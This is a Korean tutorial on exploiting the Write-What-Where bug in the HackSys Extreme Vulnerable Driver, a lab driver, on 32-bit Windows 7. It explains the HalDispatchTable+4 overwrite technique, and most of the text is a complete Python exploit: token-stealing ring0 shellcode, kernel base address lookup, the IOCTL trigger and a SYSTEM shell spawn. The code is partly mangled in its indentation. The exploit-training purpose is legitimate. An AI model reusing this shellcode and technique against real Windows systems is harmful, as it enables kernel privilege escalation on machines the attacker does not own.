# Part 2. ArbitraryOverwrite

[hacksysteam site] : https://rootkits.xyz/blog/2017/09/kernel-write-what-where/

## 1. Analysis
ArbitraryOverwrite 취약점은 우리가 익히 알고있는 Write-What-Where vulnerability 이다. 
즉, 어느곳이든 공격자가 Write 하고싶은 주소에 원하는 value를 넣을 수 있다.

<img width="725" alt="2018-12-10 3 45 47" src="https://user-images.githubusercontent.com/35731091/49715251-1d7e2b00-fc93-11e8-9f0b-ee9188e947a3.png">

what, where에 원하는 값을 넣을 수가 있다. 

### 취약점이 무엇인지 살펴보자,
* secure 부분을 보면 ProbeForRead() function을 이용하여, 공격자가 넣어준 what, where값이 user 영역인지를 검사한다. kernel부분이면 예외가 발생한다.
* secure 부분이 아닌 곳을 보면, ProbeForRead()함수를 이용하여 check하지 않음으로써 where주소가 kernel영역이여도 정상적으로 진행하게 된다.

### To call TriggerArbitraryOverwrite

    import ctypes, sys, struct
    from ctypes import *
    from subprocess import *
 
     def exploit():
         kernel32 = windll.kernel32
         psapi = windll.Psapi
         ntdll = windll.ntdll
         hevDevice = kernel32.CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", 0xC0000000, 0, None, 0x3, 0, None)
 
         if not hevDevice or hevDevice == -1:
             print "*** Couldn't get Device Driver handle"
             sys.exit(-1)
 
         buf = "A"*4+"B"*4
         bufLength = len(buf)
 
         kernel32.DeviceIoControl(hevDevice, 0x22200b, buf, bufLength, None, 0, byref(c_ulong()), None) 

     if __name__ == "__main__":
         exploit()
\`

*Result

<img width="360" alt="2018-12-10 4 09 33" src="https://user-images.githubusercontent.com/35731091/49716106-0ab92580-fc96-11e8-8aa3-a9aa04d05f64.png">


## 2. Process Exploit

What , Where 중에서 What은 당연 권한상승을 위한 쉘 코드(Shellcode)가 되어야 할것이다. 그렇다면 Where은 어느곳의 주소를 써야할까??

[poppopret] : http://poppopret.blogspot.com/2011/07/windows-kernel-exploitation-basics-part.html


이 블로그를 참조하면서 많은 도움이 되었다. 
자세한 것은 이 블로그를 참조하면 좋을 것 같다.

이 블로그의 내용을 간단히 정리하여 적용해보자면,,,,

<img width="286" alt="2018-12-10 4 23 30" src="https://user-images.githubusercontent.com/35731091/49716734-fb3adc00-fc97-11e8-9dc4-feb45d9a9f1d.png">

로 정리해 볼 수 있다.

- nt!NtQueryIntervalProfile -> call KeQueryIntervalProfile

<img width="652" alt="2018-12-10 4 26 47" src="https://user-images.githubusercontent.com/35731091/49716894-77352400-fc98-11e8-8b42-bf969eb3d408.png">

- nt!KeQueryIntervalProfile -> call HalDispatchTable + 0x4

<img width="615" alt="2018-12-10 4 31 17" src="https://user-images.githubusercontent.com/35731091/49717046-0b9f8680-fc99-11e8-981e-40e5588f7f66.png">

이제 어떤 곳을 Where 값으로 주어야 하는 지 알게되었다.
가장 선행되어야하는 것은 먼저 Kernel Module의 주소를 구해야 하는 것이다.
현재 진행하는 Windows 7 32bit환경에서는 kernel에 대한 module이 ntkrnlpa.exe이다. 

### 1. Summary Exploit Procedure 
* 1. 커널 모듈인 ntkrnlpa.exe를 User 영역으로 가져와야한다.(그래야 컨트롤이 가능)
* 2. ntkrnlpa.exe에서 HalDispatchTable의 주소를 가져온다.
* 3. HalDispatchTable+4를 쉘코드로 OverWrite한다.
* 4. Call NtQueryIntervalProfile()

### 2. ntkrnlpa.exe Address

    import ctypes, sys, struct
    from ctypes import *
    from subprocess import *

    def ntkrnl():
        kernel32 = windll.kernel32
        psapi = windll.Psapi
        ntdll = windll.ntdll
 
        #Enumerating load addresses for all device drivers, and fetching base address and name for ntkrnlpa.exe
        enum_base = (c_ulong * 1024)()
        enum = psapi.EnumDeviceDrivers(byref(enum_base), c_int(1024), byref(c_long())) #EnumDeviceDrivers(): 드라이버들의 주소들을                                                                                                                나열한다. 
        if not enum:
            print "Failed to enumerate!!!"
            sys.exit(-1)
			
        for base_address in enum_base: #ntkrnl.exe가 나올때 까지 반복
            if not base_address:
                continue

            base_name = c_char_p('\x00' * 1024)
            driver_base_name = psapi.GetDeviceDriverBaseNameA(base_address, base_name, 48) #해당 base_address의 Name(이름)을 구한                                                                                               다.
            if not driver_base_name:
                print "Unable to get driver base name!!!"
                sys.exit(-1)
 
            if base_name.value.lower() == 'ntkrnl' or 'ntkrnl' in base_name.value.lower():
                base_name = base_name.value
                print "[+] Loaded Kernel: {0}".format(base_name)
                print "[+] Base Address of Loaded Kernel: {0}".format(hex(base_address))
                break

    if __name__ == "__main__":
        ntkrnl()
    
\`


<img width="517" alt="2018-12-10 4 55 12" src="https://user-images.githubusercontent.com/35731091/49718187-bf564580-fc9c-11e8-8506-69f8ebb99564.png">

### 3. HalDispatchTable Address

* EnumDeviceDrivers()와 GetDeviceDriverBaseNameA()함수를 이용하여 원하는 드라이버의 주소를 구할 수 있다. 


> 1. kernel_handle = kernel32.LoadLibraryExA(base_name, None, 0x00000001)

> 2. hal_address = kernel32.GetProcAddress(kernel_handle, 'HalDispatchTable')
 
* 이렇게 나온 주소를 이용하여 HalDispatchTable의 주소를 가져올 수 있다.
  
> 1. hal_address -= kernel_handle # Subtracting ntkrnlpa base in user space
 
> 2. hal_address += base_address # To find the HalDispatchTable address in kernel space, add the base address of ntkrnpa in 				kernel space

> 3. hal4 = hal_address + 0x4 # Just add 0x4 to HAL address for HalDispatchTable+0x4

* 여기서 햇갈리기 시작한다. 간단히 설명하자면, hal_address -= kernel_handle 에서 kernel_handle을 빼는 이유는  LoadLibrary()함수를 이용하여 유저영역에 ntkrnl.exe를 할당했기 때문에 kernel_handle는 유저영역의 ntkrnl.exe의 시작주소이다.

* 따라서 hal_address -= kernel_handle은 단순히 HalDispatchTable의 오프셋만을 구하는 과정이다. (DLL에서 함수의 offset은 같다, Kernel에 할당되어있는 것이든, User영역에 할당하든)

* hal_address -= kernel_handle 을 통해 offset을 가져왔다. 

* base_address는 GetDeviceDriverBaseNameA()함수를 이용하여 현재 커널에서 서비스되고있는 리얼한 ntkrnl.exe의 베이스(시작)주소이다.

* HalDispatchTable은 따라서 base_address + hal_address 가 되며, HalDispatchTable + 4 역시 base_address + hal_address + 4가 된다.


### 4. Class
		class WriteWhatWhere(Structure): #Whar-Where 클래스 구현
    			_fields_ = [
        			("What", c_void_p),
        			("Where", c_void_p)
    			]
\
* 클래스를 생성(동일한 구성을 위해, 필수는 아니다.)


## 2.Exploit(exploit.py)

	import ctypes, sys, struct
	from ctypes import *
	from subprocess import *
 
	class WriteWhatWhere(Structure): #Whar-Where 클래스 구현
    		_fields_ = [
        	("What", c_void_p),
        	("Where", c_void_p)
    		]
 
	def main():
    		kernel32 = windll.kernel32
    		psapi = windll.Psapi
    		ntdll = windll.ntdll
 
		#Defining the ring0 shellcode and loading it in VirtualAlloc.
    		shellcode = bytearray(
        		"\x90\x90\x90\x90"              # NOP Sled
        		"\x60"                          # pushad
        		"\x31\xc0"                      # xor eax,eax
        		"\x64\x8b\x80\x24\x01\x00\x00"  # mov eax,[fs:eax+0x124]
        		"\x8b\x40\x50"                  # mov eax,[eax+0x50]
        		"\x89\xc1"                      # mov ecx,eax
        		"\xba\x04\x00\x00\x00"          # mov edx,0x4
        		"\x8b\x80\xb8\x00\x00\x00"      # mov eax,[eax+0xb8]
        		"\x2d\xb8\x00\x00\x00"          # sub eax,0xb8
        		"\x39\x90\xb4\x00\x00\x00"      # cmp [eax+0xb4],edx
        		"\x75\xed"                      # jnz 0x1a
        		"\x8b\x90\xf8\x00\x00\x00"      # mov edx,[eax+0xf8]
        		"\x89\x91\xf8\x00\x00\x00"      # mov [ecx+0xf8],edx
        		"\x61"                          # popad
        		"\x31\xc0"                      # xor eax,eax
        		"\x83\xc4\x24"                  # add esp,byte +0x24
        		"\x5d"                          # pop ebp
        		"\xc2\x08\x00"                  # ret 0x8
    		)
    		ptr = kernel32.VirtualAlloc(c_int(0),c_int(len(shellcode)),c_int(0x3000),c_int(0x40)) #쉘코드 공간을 만들기위해 														VirtualAlloc호출
    		buff = (c_char * len(shellcode)).from_buffer(shellcode) #local주소
    		kernel32.RtlMoveMemory(c_int(ptr),buff,c_int(len(shellcode))) #VirtualAlloc()을 이용하여 할당받은 주소에 복사

    		shellcode_address = id(shellcode) + 20
    		shellcode_final = struct.pack("<L",ptr)
    		shellcode_final_address = id(shellcode_final) + 20
 
    		print "[+] Address of ring0 shellcode: {0}".format(hex(shellcode_address))
    		print "[+] Pointer for ring0 shellcode: {0}".format(hex(shellcode_final_address))
 
    		#Enumerating load addresses for all device drivers, and fetching base address and name for ntkrnlpa.exe
    		enum_base = (c_ulong * 1024)()
    		enum = psapi.EnumDeviceDrivers(byref(enum_base), c_int(1024), byref(c_long()))
    		if not enum:
        		print "Failed to enumerate!!!"
        		sys.exit(-1)
			
    		for base_address in enum_base:
        		if not base_address:
            			continue
        		base_name = c_char_p('\x00' * 1024)
        
		driver_base_name = psapi.GetDeviceDriverBaseNameA(base_address, base_name, 48)
        	
		if not driver_base_name:
            		print "Unable to get driver base name!!!"
            		sys.exit(-1)
 
        	if base_name.value.lower() == 'ntkrnl' or 'ntkrnl' in base_name.value.lower():
            		base_name = base_name.value
            		print "[+] Loaded Kernel: {0}".format(base_name)
            		print "[+] Base Address of Loaded Kernel: {0}".format(hex(base_address))
            		break
 
    		#Getting the HalDispatchTable
    		kernel_handle = kernel32.LoadLibraryExA(base_name, None, 0x00000001)
    	
		if not kernel_handle:
        		print "Unable to get Kernel Handle"
        		sys.exit(-1)
 
    		hal_address = kernel32.GetProcAddress(kernel_handle, 'HalDispatchTable')
 
	    	# Subtracting ntkrnlpa base in user space
    		hal_address -= kernel_handle
 
	    	# To find the HalDispatchTable address in kernel space, add the base address of ntkrnpa in kernel space
    		hal_address += base_address
    
    		# Just add 0x4 to HAL address for HalDispatchTable+0x4
    		hal4 = hal_address + 0x4
 
	    	print "[+] HalDispatchTable    : {0}".format(hex(hal_address))
    		print "[+] HalDispatchTable+0x4: {0}".format(hex(hal4))
 
	    	#What-Where
    		www = WriteWhatWhere()
    		www.What = shellcode_final_address
    		www.Where = hal4
    		www_pointer = pointer(www)
 
 		print "[+] What : {0}".format(hex(www.What))
		print "[+] Where: {0}".format(hex(www.Where))
 	
 	   	hevDevice = kernel32.CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", 0xC0000000, 0, None, 0x3, 0, None)
 
    		if not hevDevice or hevDevice == -1:
        		print "*** Couldn't get Device Driver handle"
        		sys.exit(-1)
 
	    	kernel32.DeviceIoControl(hevDevice, 0x0022200B, www_pointer, 0x8, None, 0, byref(c_ulong()), None)
 
	    	#Calling the NtQueryIntervalProfile function, executing our shellcode
    		ntdll.NtQueryIntervalProfile(0x1337, byref(c_ulong()))
    
   	 	print "[+] nt authority\system shell incoming"
    		Popen("start cmd", shell=True)
 
	if __name__ == "__main__":
    	main()
\

